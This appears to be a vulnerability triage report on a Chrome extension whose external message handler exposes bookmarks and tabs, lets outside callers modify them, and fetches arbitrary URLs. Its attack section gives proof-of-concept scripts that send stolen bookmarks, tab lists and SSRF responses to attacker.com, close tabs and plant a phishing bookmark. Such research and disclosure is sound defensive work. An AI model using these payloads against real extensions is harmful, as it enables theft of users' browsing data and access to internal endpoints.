# CoCo Analysis: gjdediikaooaklfgbbegcmeakkeclgni

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 60+ (many are CoCo framework mocks; 3 main real vulnerability patterns identified)

---

## Sink 1: BookmarkTreeNode_source → sendResponseExternal_sink (CoCo Framework Mock)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gjdediikaooaklfgbbegcmeakkeclgni/opgen_generated_files/bg.js
Lines 845-871: CoCo framework BookmarkTreeNode mock objects
```

**Classification:** FALSE POSITIVE (Framework Mock)

**Reason:** Most of the detected BookmarkTreeNode_source flows (lines 845-871) are from CoCo's header framework code (before line 963, the third "// original" marker). These are CoCo-generated mock objects, not actual extension code. However, the extension does have real information disclosure vulnerabilities with bookmarks (see Sink 2).

---

## Sink 2: bg_chrome_runtime_MessageExternal → BookmarkSearchQuery_sink + Information Disclosure

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gjdediikaooaklfgbbegcmeakkeclgni/opgen_generated_files/bg.js
Line 1004: chrome.tabs.query(request.settings, (tabs) => sendResponse(tabs));
Line 1068: chrome.bookmarks.getSubTree(request.settings.id, (bookmarks) => sendResponse(bookmarks));
Line 1072: chrome.bookmarks.search(request.settings, (bookmarks) => sendResponse(bookmarks));
Line 1076: chrome.bookmarks.create(request.settings, (bookmarks) => sendResponse(bookmarks));
Line 1080: chrome.bookmarks.getTree((bookmarks) => sendResponse(bookmarks));
```

**Code:**

```javascript
// Background script (bg.js) - Lines 997-1110
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
    console.log('received a new request');
    console.log(request);

    if (request.type == 'getAllWindows') {
      chrome.windows.getAll({}, (windows) => sendResponse(windows));
      // ← Leak all windows to attacker
    } else if (request.type == 'getTabs') {
      chrome.tabs.query(request.settings, (tabs) => sendResponse(tabs));
      // ← Leak tabs matching attacker-controlled query to attacker
    } else if (request.type == 'updateTab') {
      chrome.tabs.update(request.id, request.settings, (tabs) =>
        sendResponse(tabs),
      );
      // ← Update tabs with attacker-controlled settings
    } else if (request.type == 'highlight') {
      chrome.tabs.highlight(request.settings, (tabs) => sendResponse(tabs));
    } else if (request.type == 'deleteTab') {
      chrome.tabs.remove(request.settings, (tabs) => sendResponse(tabs));
      // ← Delete arbitrary tabs
    } else if (request.type == 'getSubTree') {
      chrome.bookmarks.getSubTree(request.settings.id, (bookmarks) =>
        sendResponse(bookmarks),
      );
      // ← Leak bookmark subtree to attacker
    } else if (request.type == 'searchBookmarks') {
      chrome.bookmarks.search(request.settings, (bookmarks) =>
        sendResponse(bookmarks),
      );
      // ← Leak bookmarks matching search to attacker
    } else if (request.type == 'createBookmark') {
      chrome.bookmarks.create(request.settings, (bookmarks) =>
        sendResponse(bookmarks),
      );
      // ← Create arbitrary bookmarks
    } else if (request.type == 'getBookmarks') {
      chrome.bookmarks.getTree((bookmarks) => sendResponse(bookmarks));
      // ← Leak ALL bookmarks to attacker
    } else if (request.type == 'moveBookmark') {
      chrome.bookmarks.move(request.id, request.settings, (bookmarks) =>
        sendResponse(bookmarks),
      );
      // ← Move bookmarks arbitrarily
    } else if (request.type == 'getFavicon') {
      const getBase64FromUrl = async (url) => {
        const data = await fetch(url);  // ← SSRF with attacker-controlled URL
        const blob = await data.blob();
        return new Promise((resolve) => {
          const reader = new FileReader();
          reader.readAsDataURL(blob);
          reader.onloadend = () => {
            const base64data = reader.result;
            resolve(base64data);
          };
        });
      };

      getBase64FromUrl(request.settings.url).then((data) => {
        sendResponse(data);  // ← Send fetched data back to attacker
      });
    } else if (request.type == 'getCurrentTabs') {
      chrome.tabs.query({ currentWindow: true }, function (tabs) {
        sendResponse(tabs);  // ← Leak current window tabs
      });
    }
  },
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal from whitelisted external websites/extensions

**Attack:**

```javascript
// From whitelisted domains (http://localhost:3000/* or https://www.zeistab.com/)
// Or from ANY extension (externally_connectable has "ids": ["*"])

// Attack 1: Steal all bookmarks
chrome.runtime.sendMessage(
    'gjdediikaooaklfgbbegcmeakkeclgni',
    {
        type: 'getBookmarks'
    },
    function(bookmarks) {
        // Attacker receives complete bookmark tree
        fetch('https://attacker.com/steal/bookmarks', {
            method: 'POST',
            body: JSON.stringify(bookmarks)
        });
    }
);

// Attack 2: Steal all tabs information
chrome.runtime.sendMessage(
    'gjdediikaooaklfgbbegcmeakkeclgni',
    {
        type: 'getTabs',
        settings: {}  // Empty query returns all tabs
    },
    function(tabs) {
        // Attacker receives all tabs (URLs, titles, etc.)
        fetch('https://attacker.com/steal/tabs', {
            method: 'POST',
            body: JSON.stringify(tabs)
        });
    }
);

// Attack 3: SSRF via getFavicon
chrome.runtime.sendMessage(
    'gjdediikaooaklfgbbegcmeakkeclgni',
    {
        type: 'getFavicon',
        settings: {
            url: 'http://localhost:8080/admin/secrets'
        }
    },
    function(data) {
        // Attacker receives base64-encoded response from internal endpoint
        fetch('https://attacker.com/steal/ssrf', {
            method: 'POST',
            body: data
        });
    }
);

// Attack 4: Delete arbitrary tabs
chrome.runtime.sendMessage(
    'gjdediikaooaklfgbbegcmeakkeclgni',
    {
        type: 'deleteTab',
        settings: [1, 2, 3, 4, 5]  // Close multiple tabs
    }
);

// Attack 5: Create malicious bookmarks
chrome.runtime.sendMessage(
    'gjdediikaooaklfgbbegcmeakkeclgni',
    {
        type: 'createBookmark',
        settings: {
            title: 'Free Money',
            url: 'https://phishing-site.com/steal-credentials'
        }
    }
);
```

**Impact:** Multiple severe vulnerabilities:

1. **Information Disclosure - Bookmarks**: Attacker can retrieve the complete bookmark tree containing all user bookmarks, which may include sensitive URLs, internal company links, and personal information.

2. **Information Disclosure - Tabs**: Attacker can retrieve information about all open tabs, including URLs and titles, exposing user's browsing history and potentially sensitive pages they have open.

3. **SSRF (Server-Side Request Forgery)**: The `getFavicon` function performs a fetch() with attacker-controlled URL and returns the base64-encoded response. This allows the attacker to:
   - Access internal/localhost endpoints
   - Probe internal network
   - Exfiltrate responses from privileged endpoints
   - Bypass same-origin policy

4. **Tab Manipulation**: Attacker can delete arbitrary tabs, disrupting user's browsing session.

5. **Bookmark Manipulation**: Attacker can create and move bookmarks, potentially injecting phishing links or malicious content into user's bookmarks.

The extension has permissions for "tabs", "tabGroups", and "bookmarks" in manifest.json. The externally_connectable configuration allows ANY extension ("ids": ["*"]) and specific domains (localhost:3000, zeistab.com) to send messages, making these vulnerabilities fully exploitable.

---

## Sink 3: bg_chrome_runtime_MessageExternal → BookmarkCreate_sink

**Classification:** TRUE POSITIVE (covered by Sink 2 analysis)

This is part of the same vulnerability pattern where attacker-controlled bookmark operations are performed via external messages.
